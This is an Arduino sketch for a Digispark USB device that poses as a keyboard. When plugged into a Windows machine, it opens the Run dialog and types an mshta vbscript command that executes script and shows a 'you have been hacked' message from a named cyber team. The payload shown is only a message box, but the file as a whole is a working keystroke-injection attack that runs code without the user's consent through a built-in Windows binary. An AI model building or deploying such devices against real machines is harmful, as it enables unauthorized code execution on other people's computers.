#include "DigiKeyboard.h"
void setup() {
  // don't need to set anything up to use DigiKeyboard
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.println("mshta vbscript:Execute(\"msgbox(\"\"Hacklendiniz \"\" ,64, \"\"Karaelmas Cyber Team\"\")(window.close)\")");


}
void loop() {

}
